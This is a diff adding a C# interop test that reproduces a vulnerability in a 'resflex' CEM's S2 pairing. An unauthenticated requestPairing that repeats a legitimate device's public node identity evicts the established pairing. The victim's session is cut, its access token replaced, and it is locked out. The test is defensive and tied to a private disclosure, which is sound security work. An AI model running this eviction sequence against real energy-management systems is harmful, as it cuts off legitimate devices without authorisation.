@@ -578,6 +578,82 @@ namespace cloud.charging.open.protocols.S2.InteropTests.Resflex
 
         #endregion
 
+        #region ResflexCEM_UnauthenticatedRequestPairingEvictsAnEstablishedPairing()
+
+        /// <summary>
+        /// An established, authenticated pairing with a live session must survive a requestPairing
+        /// from a party that does not know the pairing token. The HMAC challenge-response, which is
+        /// the proof of token knowledge, is verified only at requestConnectionDetails; requestPairing
+        /// already rebuilds and persists the paired node and closes the node's active WebSocket.
+        /// A request that merely repeats the victim's node identification — the CEM advertises the
+        /// node description under /pairing/nodes, it is not a secret — therefore evicts the running
+        /// RM: its session is cut and its access token replaced, so it can no longer initiate a
+        /// session. This is the root cause of E1 with a graver consequence. Security-relevant;
+        /// reported privately per the library's SECURITY.md, not as a public issue (FINDINGS.md, E4).
+        /// </summary>
+        [Test]
+        [S2C("Pairing.LAN.ResflexCEM.UnauthenticatedRePairingEvictsPairing")]
+        public async Task ResflexCEM_UnauthenticatedRequestPairingEvictsAnEstablishedPairing()
+        {
+
+            await using var cem = await StartCEMAsync();
+
+            var (endpoint, node, store) = WWCPResourceManager();
+            await using var pairingClient = NewPairingClient(cem, endpoint, store);
+
+            var paired = await pairingClient.PairAsync(node, PairingToken.Parse(Token), PairingTarget.ByNodeId(cem.NodeId));
+            Assert.That(paired.IsSuccess, Is.True, () => $"{paired}{Environment.NewLine}{cem.Process.Diagnostics}");
+
+            await using var client = new SessionInitiationClient(paired.Pairing!.InitiateSessionUrl!.Value,
+                                                                 endpoint,
+                                                                 store,
+                                                                 new SessionInitiationClientOptions { ServiceUnavailableRetryDelay = TimeSpan.FromMilliseconds(100) },
+                                                                 WebSocketCertificateValidator: Certificates.AcceptAny<IWebSocketClient>());
+
+            var connect = await client.ConnectAsync(node, cem.NodeId);
+            Assert.That(connect.IsSuccess, Is.True, () => $"{connect.Initiation}{Environment.NewLine}{cem.Process.Diagnostics}");
+
+            await cem.Process.WaitForEventAsync(e => e.Value<String>("event") == "ws_open" && e.Value<String>("node_id") == node.Id.ToString(),
+                                                Description: "the WebSocket of the legitimate RM");
+
+            var tokenBefore = cem.Persisted?.Value<String>(node.Id.ToString());
+
+            // A second party that knows only the RM's node description, not the pairing token:
+            // requestPairing by hand, repeating the victim's node identification, with a fresh
+            // random HMAC challenge it cannot answer (and never has to here, since requestPairing
+            // does not verify it).
+            var foreign = new RequestPairingRequest(node.Description,
+                                                    endpoint.Description,
+                                                    node.SupportedCommunicationProtocols,
+                                                    node.SupportedS2MessageVersions,
+                                                    [ HmacHashingAlgorithm.SHA256 ],
+                                                    HmacChallenge.NewRandom(),
+                                                    PairingTarget.ByNodeId(cem.NodeId));
+
+            var (foreignStatus, foreignBody) = await PostPairingAsync(cem, "requestPairing", foreign.ToJSON());
+
+            var victimWebSocketClosed = await cem.Process.SawEventAsync(e => e.Value<String>("event") == "ws_closed" && e.Value<String>("node_id") == node.Id.ToString());
+            await connect.Session!.DisposeAsync();
+
+            var tokenAfter = cem.Persisted?.Value<String>(node.Id.ToString());
+
+            // The legitimate RM, with the token it holds, tries to initiate a session again.
+            var reconnect = await client.ConnectAsync(node, cem.NodeId);
+            if (reconnect.IsSuccess)
+                await reconnect.Session!.DisposeAsync();
+
+            // The request was accepted although its HMAC challenge was never answered, and it undid
+            // the established pairing: the legitimate RM can no longer initiate a session.
+            var pairingEvicted = foreignStatus == 200 && !reconnect.IsSuccess;
+
+            Interop.KnownIssue("resflex E4: an unauthenticated requestPairing with a known node id evicts an established pairing (closes the session, replaces the access token, locks the RM out)",
+                               pairingEvicted,
+                               $"foreign requestPairing: {foreignStatus} {foreignBody?.ToString(Newtonsoft.Json.Formatting.None)}; victim WebSocket closed: {victimWebSocketClosed}; persisted token before {tokenBefore}, after {tokenAfter}; legitimate reconnect: {reconnect.IsSuccess} ({reconnect.Initiation})");
+
+        }
+
+        #endregion
+
     }
 
 }
